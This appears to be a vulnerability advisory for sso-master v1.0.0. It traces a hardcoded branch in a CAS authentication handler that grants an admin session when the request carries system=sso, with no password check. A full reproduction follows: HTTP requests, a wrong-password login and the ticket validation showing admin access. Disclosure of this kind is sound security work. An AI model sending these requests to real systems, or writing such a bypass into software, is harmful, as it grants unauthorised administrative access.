# sso-master — CAS admin passwordless authentication (system=sso bypass)

## Introduction

The CAS login webflow of sso-master replaces the default credential with `UsernamePasswordSysCredential` and binds an extra `system` HTTP parameter（CustomWebflowConfigurer.java:55-63). `UsernamePasswordSystemAuthenticationHandler` is registered **unconditionally** with order=1（CustomAuthenticationEventExecutionPlanConfiguration.java:55-60), and its `doAuthentication()` contains a hardcoded success branch（UsernamePasswordSystemAuthenticationHandler.java:34-41):

```java
if ("admin".equals(username) && "sso".equals(system)) {
    return createHandlerResult(...);   // AUTH SUCCESS, password NEVER verified
}
```

So `POST /cas/login` with `username=admin&system=sso&password=<anything>` yields a valid admin TGT/SSO session with **zero password verification** — no captcha applies to this login type（ValidateLoginCaptchaAction.java:56-67).

## Affected versions

sso-master v1.0.0

## Utilize conditions

- Target CAS login page reachable (`/cas/login`)
- No account, no captcha, no password needed — only `admin`/`sso` literals

---

## Vulnerability Reproduction

**Step 1** — fetch a fresh CAS `execution`:

```http
GET /cas/login HTTP/1.1
Host: <target>
```

![image-20260824145655094](https://github.com/fangtang7/picx-images-hosting/raw/master/Digital-Infrastructure/image-20260824145655094.3rbys5wtaw.webp)

Response header:

```text
X-Execution: <flowExecutionKey>
```

**Step 2** — log in as admin with `system=sso` and an **arbitrary (wrong) password**:

```http
POST /cas/login HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded

username=admin&password=totally-wrong-password-123&system=sso&execution=<flowExecutionKey>&_eventId=submit
```

![image-20260824145745387](https://github.com/fangtang7/picx-images-hosting/raw/master/Digital-Infrastructure/image-20260824145745387.6bht4sx4uh.webp)

Response (2026-08-24 live) — ST + TGC issued with no password check:

```json
{"success":true,"msg":"ST-1fb7fb7990ad4348a1f812e5bae36cb6"}
```

**Step 3** — validate the service ticket, principal is `admin`:

```http
GET /cas/serviceValidate?ticket=ST-1fb7fb7990ad4348a1f812e5bae36cb6 HTTP/1.1
Host: <target>
```

![image-20260824145901068](https://github.com/fangtang7/picx-images-hosting/raw/master/Digital-Infrastructure/image-20260824145901068.8adzv530bv.webp)

Response :

```xml
<cas:serviceResponse xmlns:cas='http://www.yale.edu/tp/cas'>
  <cas:authenticationSuccess><cas:user>admin</cas:user></cas:authenticationSuccess>
</cas:serviceResponse>
```

Control — the same form **without** `system=sso` and a wrong password FAILS (`Bad credentials`), proving only the hardcoded branch skips verification.

code:

![image-20260824152240366](https://github.com/fangtang7/picx-images-hosting/raw/master/Digital-Infrastructure/image-20260824152240366.4n8g7m7kaf.webp)

![image-20260824153256343](https://github.com/fangtang7/picx-images-hosting/raw/master/Digital-Infrastructure/image-20260824153256343.60uzbnizdl.webp)
